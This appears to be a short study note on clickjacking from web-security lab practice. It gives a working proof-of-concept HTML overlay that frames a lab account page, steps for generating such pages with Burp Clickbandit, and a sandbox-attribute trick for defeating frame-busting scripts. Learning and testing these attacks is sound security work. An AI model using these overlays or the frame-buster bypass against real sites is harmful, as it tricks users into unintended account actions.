### Clickjacking

**Clickjacking PoC:**
```
<style>
    iframe {
        position:relative;
        width:99vw;
        height: 99vh;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:400px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a96005403001104812e3ea900bf0098.web-security-academy.net/my-account"></iframe>
```

**Clickbandit:**
- Used to automatically generate PoCs
- Steps:
  - Burp Menu -> Clickbandit
  - Paste the scripts in the JS console
  - Click start, perform actions, click finish to record
  - Save

**Scripts Blocking Iframes**
- Sometimes websites have scripts checking to make sure iframes are visible and the main page is the top menu
- Can usually be circumvented using iframe `sandbox` attribute
  - `<iframe id="victim_website" src="https://{vulnerable_site}.com" sandbox="allow-forms"></iframe>`
  - Clickbandit supports this